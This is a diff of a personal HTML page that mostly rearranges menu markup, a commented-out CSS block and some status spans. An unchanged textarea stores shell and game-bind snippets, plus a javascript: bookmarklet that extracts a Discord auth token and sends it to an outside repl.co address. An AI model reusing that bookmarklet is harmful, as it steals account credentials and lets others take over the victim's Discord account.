@@ -15,11 +15,31 @@ textarea { width: 50%; }
 body { background-image: url("background2.jpg"); } }
 #hide:checked ~ .auto_resize { display: none; }
 
-.main_menu ul { list-style-type: none; }
+.main_menu ul { list-style-type: none; cursor: pointer; }
 .main_menu ul li ul { flex-direction: column; display: none; }
 .main_menu ul li:hover > ul { display: flex; }
 .main_menu ul { background-color: black; color: white; }
 </style>
+
+<!--
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap");
+font-family: 'Poppins', sans-serif;
+
+#menu::before
+input[type="search"]
+
+content: "" !important;
+transform: rotate(20deg);
+transition: all 0.3s ease;
+user-select: none;
+font-size: 2rem;
+object-fit: cover;
+word-break: break-all;
+grid-template-columns auto 1fr 20px 8ch;
+pointer-events: auto;
+border: none;
+outline: none;
+-->
 
 <div class="main_menu">
 <ul style="justify-content: space-between; display: flex;">
@@ -74,6 +94,12 @@ body { background-image: url("background2.jpg"); } }
 <div id="home"></div>
 <div id="result"></div>
 
+<a href="#user_ip">Mouise</a>
+<span id="user_ip">IP</span>
+<span id="progress">MBPS</span>
+
+<input type="checkbox" id="hide" unchecked><label for="hide" id="playing_indicator" style="display: none;">Hide</label>
+
 <div id="music_position"></div>
 
 <a target="_blank" rel="noopener noreferrer" href="https://shopee.ph/Watercolor-Sketchbook-(200-gsm)-i.405891306.12809265345">
@@ -106,30 +132,6 @@ body { background-image: url("background2.jpg"); } }
 </form>
 <div id="posts">Posts</div>
 
-<a href="#user_ip">Mouise</a>
-<span id="user_ip">IP</span>
-<span id="progress">MBPS</span>
-<!--
-@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap");
-font-family: 'Poppins', sans-serif;
-
-#menu::before
-input[type="search"]
-
-content: "" !important;
-transform: rotate(20deg);
-transition: all 0.3s ease;
-cursor: pointer;
-user-select: none;
-font-size: 2rem;
-object-fit: cover;
-word-break: break-all;
-grid-template-columns auto 1fr 20px 8ch;
-pointer-events: auto;
-border: none;
-outline: none;
--->
-<input type="checkbox" id="hide" unchecked><label for="hide" id="playing_indicator" style="display: none;">Hide</label>
 <textarea class="auto_resize">client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
